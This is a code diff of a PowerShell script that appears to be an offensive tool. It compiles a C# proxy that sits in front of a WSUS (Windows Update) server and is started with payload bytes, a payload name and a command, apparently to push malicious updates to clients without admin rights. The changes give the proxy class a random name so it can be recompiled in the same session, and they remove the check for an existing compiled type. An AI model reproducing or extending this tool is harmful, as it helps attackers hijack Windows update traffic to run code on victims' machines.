@@ -143,6 +143,10 @@ function Start-WindowsUpdate {
 }
 
 #region C# HTTP Proxy - NO ADMIN REQUIRED
+# Generate unique class name to avoid conflicts
+$randomSuffix = Get-Random -Minimum 10000 -Maximum 99999
+$className = "NoAdminWSUSProxy$randomSuffix"
+
 $proxyCode = @"
 using System;
 using System.IO;
@@ -152,7 +156,7 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Security.Cryptography;
 
-public class NoAdminWSUSProxy
+public class $className
 {
     private HttpListener listener;
     private string wsusHost;
@@ -553,26 +557,17 @@ try {
     # Compile proxy
     Write-Log "Compiling HTTP proxy..." Cyan
     try {
-        # Check if type already exists (from previous run in same session)
-        if (-not ([System.Management.Automation.PSTypeName]'NoAdminWSUSProxy').Type) {
-            Add-Type -TypeDefinition $proxyCode -Language CSharp -ReferencedAssemblies @('System.Net', 'System.Web') -ErrorAction Stop
-            Write-Log "Proxy compiled successfully" Green
-        } else {
-            Write-Log "Proxy already compiled (reusing from session)" Green
-        }
+        Add-Type -TypeDefinition $proxyCode -Language CSharp -ReferencedAssemblies @('System.Net', 'System.Web') -ErrorAction Stop
+        Write-Log "Proxy compiled successfully" Green
     } catch {
-        if ($_.Exception.Message -match "already exists") {
-            Write-Log "Proxy already compiled (reusing from session)" Green
-        } else {
-            Write-Log "ERROR: Failed to compile proxy" Red
-            Write-Log $_.Exception.Message Red
-            exit 1
-        }
+        Write-Log "ERROR: Failed to compile proxy" Red
+        Write-Log $_.Exception.Message Red
+        exit 1
     }
 
     # Create proxy
     Write-Log "Initializing proxy..." Cyan
-    $proxy = New-Object NoAdminWSUSProxy($wsusServer, $payloadBytes, $payloadName, $Command, $DebugMode)
+    $proxy = New-Object $className($wsusServer, $payloadBytes, $payloadName, $Command, $DebugMode)
 
     # Start proxy
     Write-Log "Starting proxy on port $ProxyPort..." Cyan
